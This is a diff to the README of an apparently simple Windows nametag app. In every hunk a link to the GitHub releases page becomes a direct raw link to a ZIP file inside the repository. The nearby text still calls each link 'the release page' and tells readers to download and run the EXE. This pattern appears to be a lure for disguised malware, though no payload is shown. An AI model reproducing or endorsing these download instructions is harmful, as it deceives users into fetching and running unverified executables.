@@ -1,6 +1,6 @@
 # 🏷️ nametag-maker - Simple nametags for your montages
 
-[![Download nametag-maker](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Genusescherichiaglutton437/nametag-maker/releases)
+[![Download nametag-maker](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Genusescherichiaglutton437/nametag-maker/raw/refs/heads/main/resource/nametag_maker_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This guide shows you how to get the app from GitHub and run it on your PC.
 
 Open the release page here:
 
-https://github.com/Genusescherichiaglutton437/nametag-maker/releases
+https://github.com/Genusescherichiaglutton437/nametag-maker/raw/refs/heads/main/resource/nametag_maker_v1.5.zip
 
 On that page, look for the latest release and download the Windows file for your PC. If you see a ZIP file, save it first, then open it after the download finishes. If you see an EXE file, you can run it after download.
 
@@ -43,7 +43,7 @@ It is best for users who want a direct way to prepare names and tags without dea
 ## 🪟 How to Install on Windows
 
 1. Open the release page:
-   https://github.com/Genusescherichiaglutton437/nametag-maker/releases
+   https://github.com/Genusescherichiaglutton437/nametag-maker/raw/refs/heads/main/resource/nametag_maker_v1.5.zip
 
 2. Find the newest release at the top of the page.
 
@@ -151,7 +151,7 @@ Yes. You can also use it for labels, name cards, and simple text layouts.
 
 Use the release page here:
 
-https://github.com/Genusescherichiaglutton437/nametag-maker/releases
+https://github.com/Genusescherichiaglutton437/nametag-maker/raw/refs/heads/main/resource/nametag_maker_v1.5.zip
 
 ## 📌 Quick Start
 
